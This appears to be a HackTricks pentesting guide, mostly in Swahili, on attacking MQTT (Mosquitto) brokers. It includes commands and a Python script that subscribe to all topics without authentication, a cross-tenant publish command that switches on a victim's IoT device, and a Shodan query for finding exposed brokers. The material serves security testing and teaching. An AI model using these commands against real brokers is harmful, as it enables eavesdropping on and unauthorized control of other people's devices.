# 1883 - Pentesting MQTT (Mosquitto)

{{#include ../banners/hacktricks-training.md}}

## Taarifa za Msingi

**MQ Telemetry Transport (MQTT)** inajulikana kama **protokoli ya ujumbe ya kuchapisha/kujisajili** inayojitokeza kwa unyenyekevu mkubwa na uzito mdogo. Protokoli hii imebuniwa mahsusi kwa mazingira ambapo vifaa vina uwezo mdogo na vinafanya kazi juu ya mitandao inayotambulika kwa bandwidth ndogo, ucheleweshaji mkubwa, au miunganisho isiyo ya kuaminika. Malengo makuu ya MQTT ni kupunguza matumizi ya bandwidth ya mtandao na kupunguza mahitaji kwa rasilimali za kifaa. Zaidi ya hayo, inalenga kudumisha mawasiliano ya kuaminika na kutoa kiwango fulani cha uhakika wa utoaji. Malengo haya hufanya MQTT iwe bora kabisa kwa sekta inayokua ya **machine-to-machine (M2M) communication** na **Internet of Things (IoT)**, ambapo ni muhimu kuunganisha idadi kubwa ya vifaa kwa ufanisi. Zaidi yake, MQTT inafaidi sana programu za rununu, ambapo kuokoa bandwidth na maisha ya betri ni muhimu.

**Default port:** 1883
```
PORT     STATE SERVICE                 REASON
1883/tcp open  mosquitto version 1.4.8 syn-ack
```
## Kuchunguza trafiki

Wakati kifurushi cha **CONNECT** kinapopokelewa na MQTT brokers, kifurushi cha **CONNACK** kinatumwa kurudisha. Kifurushi hiki kina msimbo wa kurudi ambao ni muhimu kuelewa hali ya muunganisho. Msimbo wa kurudi **0x00** unamaanisha kwamba credentials zimekubaliwa, ikibainisha muunganisho uliofanikiwa. Kwa upande mwingine, msimbo wa kurudi **0x05** unaashiria kwamba credentials ni batili, hivyo kuzuia muunganisho.

Kwa mfano, ikiwa broker anakata muunganisho kwa sababu ya credentials zisizo sahihi, hali hiyo itakuwa kama ifuatavyo:
```
{
"returnCode": "0x05",
"description": "Connection Refused, not authorized"
}
```
![](<../images/image (976).png>)

### [**Brute-Force MQTT**](../generic-hacking/brute-force.md#mqtt)

## Pentesting MQTT

**Authentication is totally optional** na hata kama Authentication inafanywa, **encryption is not used by default** (credentials are sent in clear text). MITM attacks bado zinaweza kutekelezwa ili kuiba passwords.

To connect to a MQTT service you can use: [https://github.com/bapowell/python-mqtt-client-shell](https://github.com/bapowell/python-mqtt-client-shell) and subscribe yourself to all the topics doing:
```
> connect (NOTICE that you need to indicate before this the params of the connection, by default 127.0.0.1:1883)
> subscribe "#" 1
> subscribe "$SYS/#"
```
Unaweza pia kutumia [**https://github.com/akamai-threat-research/mqtt-pwn**](https://github.com/akamai-threat-research/mqtt-pwn)

Unaweza pia kutumia:
```bash
apt-get install mosquitto mosquitto-clients
mosquitto_sub -t 'test/topic' -v #Subscribe to 'test/topic'
mosquitto_sub -h <host-ip> -t "#" -v #Subscribe to ALL topics.
```
Au unaweza **run this code ili kujaribu kuungana na huduma ya MQTT bila uthibitisho, subscribe kwa kila topic na kuzisikiliza**:
```python
#This is a modified version of https://github.com/Warflop/IOT-MQTT-Exploit/blob/master/mqtt.py
import paho.mqtt.client as mqtt
import time
import os

HOST = "127.0.0.1"
PORT = 1883

def on_connect(client, userdata, flags, rc):
client.subscribe('#', qos=1)
client.subscribe('$SYS/index.html#')

def on_message(client, userdata, message):
print('Topic: %s | QOS: %s  | Message: %s' % (message.topic, message.qos, message.payload))

def main():
client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message
client.connect(HOST, PORT)
client.loop_start()
#time.sleep(10)
#client.loop_stop()

if __name__ == "__main__":
main()
```
### Mfumo wa Publish/Subscribe <a href="#b667" id="b667"></a>

Modeli ya publish/subscribe inajumuisha:

- **Publisher**: huchapisha ujumbe kwa topic moja (au nyingi) kwenye broker.
- **Subscriber**: hujiandikisha kwa topic moja (au nyingi) kwenye broker na hupokea ujumbe wote uliotumwa na publisher.
- **Broker**: hupeleka ujumbe wote kutoka kwa publishers hadi kwa subscribers.
- **Topic**: inajumuisha ngazi moja au zaidi zinazotengwa kwa forward slash (mfano, /smartshouse/livingroom/temperature).

### Muundo wa Paketi <a href="#f15a" id="f15a"></a>

Kila paketi ya MQTT ina fixed header (Figure 02).Figure 02: Fixed Header

![https://miro.medium.com/max/838/1*k6RkAHEk0576geQGUcKSTA.png](https://miro.medium.com/max/838/1*k6RkAHEk0576geQGUcKSTA.png)

### Aina za Paketi

- CONNECT (1): Huanzishwa na client ili kuomba muunganisho na server.
- CONNACK (2): Uthibitisho wa server wa muunganisho uliofanikiwa.
- PUBLISH (3): Inatumiwa kutuma ujumbe kutoka client hadi server au kinyume chake.
- PUBACK (4): Uthibitisho wa paketi ya PUBLISH.
- PUBREC (5): Sehemu ya protocol ya utoaji ujumbe inayohakikisha ujumbe umepokelewa.
- PUBREL (6): Uhakikisho zaidi katika utoaji ujumbe, kinachoonyesha kuachiliwa kwa ujumbe.
- PUBCOMP (7): Sehemu ya mwisho ya protocol ya utoaji ujumbe, inayoonyesha kukamilika.
- SUBSCRIBE (8): Ombi la client kusikiliza ujumbe kutoka kwa topic.
- SUBACK (9): Uthibitisho wa server kwa ombi la SUBSCRIBE.
- UNSUBSCRIBE (10): Ombi la client kusitisha kupokea ujumbe kutoka topic.
- UNSUBACK (11): Jibu la server kwa ombi la UNSUBSCRIBE.
- PINGREQ (12): Ujumbe wa heartbeat unaotumwa na client.
- PINGRESP (13): Jibu la server kwa ujumbe wa heartbeat.
- DISCONNECT (14): Huanzishwa na client kumaliza muunganisho.
- Thamani mbili, 0 na 15, zimehifadhiwa na matumizi yao ni marufuku.

## Mashambulizi katika ekosistimu ya IoT MQTT: plaintext brokers and topic ACL bypass

Mifumo mingi ya IoT kwa watumiaji inaonyesha MQTT brokers zinazotumiwa na majukumu mawili tofauti:
- Vifaa vya gateway/hub vinavyounganisha protocols za redio (mfano, BLE/LoRa/Zigbee) na cloud.
- Mobile apps au web backends zinazosimamia vifaa kupitia “app” topics.

Udhaifu wa kawaida unaweza kuzitumia wakati wa pentest:

- Plaintext MQTT kwenye port zisizo za kawaida (mfano, TCP/8001) badala ya MQTTS. Mtu yeyote anayekaa kwenye njia (on-path) anaweza kusoma maelezo ya kuingia (credentials) na control frames. Tumia Wireshark kutambua trafiki ya maandishi wazi ya CONNECT/CONNACK na SUBSCRIBE/PUBLISH kwenye port zisizo za kawaida.
- ACL za topic za per-tenant dhaifu au zisizokuwepo. Ikiwa topics zimepewa namespace kwa deviceId pekee (mfano, "/tenantless/<deviceId>/tx"), mtumiaji yeyote aliyethibitishwa anaweza PUBLISH kwa vifaa vya tenants wengine.
- Kutolewa kwa data nyeti kupitia maintenance/admin topics (mfano, Wi‑Fi credentials kutangazwa kwa maandishi wazi baada ya mabadiliko ya config).

Mifano (badilisha placeholders kwa thamani halisi):

Jiandikishe kwa topics zinazoweza kuwa nyeti kwa kutumia topic prefixes zinazoeleweka na device IDs:
```bash
# Using mosquitto_sub
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
Udhibiti kati ya tenanti wakati ACLs ziko dhaifu (publish to device topic ya tenanti nyingine):
```bash
mosquitto_pub -h <app-broker> -p <port> -V mqttv311 \
-i <your_client_id> -u <your_username> -P <your_password> \
-t "/ys/<victimDeviceId>/tx" \
-m '{"method":"Device.setState","params":{"state":{"power":"on"}},"targetDevice":"<victimDeviceId>"}'
```
## Shodan

- `port:1883 MQTT`
- Plaintext ya MQTT kwenye bandari zisizo za kawaida ni ya kawaida katika IoT. Fikiria kutafuta brokers kwenye bandari mbadala na uthibitishe kwa kugundua itifaki.

## Marejeleo

- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

{{#include ../banners/hacktricks-training.md}}
